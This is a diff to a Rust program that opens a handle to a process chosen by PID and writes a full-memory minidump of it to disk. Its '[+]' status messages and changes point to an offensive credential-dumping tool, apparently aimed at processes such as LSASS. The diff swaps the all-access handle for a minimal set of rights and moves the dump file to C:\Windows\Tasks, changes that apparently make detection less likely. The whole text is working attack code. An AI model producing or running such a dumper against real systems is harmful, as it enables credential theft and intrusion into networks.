@@ -29,12 +29,22 @@ fn main() {
 
     unsafe {
         println!("[+] Opening handle to process...");
-        let h_proc: HANDLE = OpenProcess(PROCESS_ACCESS_RIGHTS(2035711), false, pid).expect("Error opening handle to process");
+        const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
+        const PROCESS_VM_OPERATION: u32 = 0x0008;
+        const PROCESS_VM_READ: u32 = 0x0010;
+        const PROCESS_VM_WRITE: u32 = 0x0020;
+        
+        let h_proc: HANDLE = OpenProcess(
+            PROCESS_ACCESS_RIGHTS(
+                PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE
+            ),
+            false,
+            pid).expect("Error opening handle to process");
 
         const GENERIC_READ: u32 = 0x80000000;
         const GENERIC_WRITE: u32 = 0x40000000;
 
-        let f_name: PCSTR = s!("C:\\Windows\\Temp\\rustdump.dmp");
+        let f_name: PCSTR = s!("C:\\Windows\\Tasks\\rustdump.dmp");
         let mut sa: SECURITY_ATTRIBUTES = SECURITY_ATTRIBUTES::default();
         println!("[+] Creating file...");
         let h_file: HANDLE = CreateFileA(
@@ -47,9 +57,9 @@ fn main() {
             HANDLE(0)
         ).unwrap();
 
-        let mini_excep: MINIDUMP_EXCEPTION_INFORMATION = MINIDUMP_EXCEPTION_INFORMATION::default();
-        let mini_userstr: MINIDUMP_USER_STREAM_INFORMATION = MINIDUMP_USER_STREAM_INFORMATION::default();
-        let mini_cb: MINIDUMP_CALLBACK_INFORMATION = MINIDUMP_CALLBACK_INFORMATION::default();
+        let mini_excep: *const MINIDUMP_EXCEPTION_INFORMATION = std::ptr::null();
+        let mini_userstr: *const MINIDUMP_USER_STREAM_INFORMATION = std::ptr::null();
+        let mini_cb: *const MINIDUMP_CALLBACK_INFORMATION = std::ptr::null();
 
         println!("[+] Creating dump...");
         if !MiniDumpWriteDump(
@@ -57,14 +67,17 @@ fn main() {
             pid,
             h_file,
             MiniDumpWithFullMemory,
-            Some(&mini_excep),
-            Some(&mini_userstr),
-            Some(&mini_cb)
+            Some(mini_excep),
+            Some(mini_userstr),
+            Some(mini_cb)
         ).as_bool() {
             let e = GetLastError();
+            CloseHandle(h_file);
+            CloseHandle(h_proc);
             panic!("Error creating dump! {:?}", e);
         }
         CloseHandle(h_file);
+        CloseHandle(h_proc);
         println!("[+] Dump file saved to {}", f_name.to_string().unwrap());
     }
 }
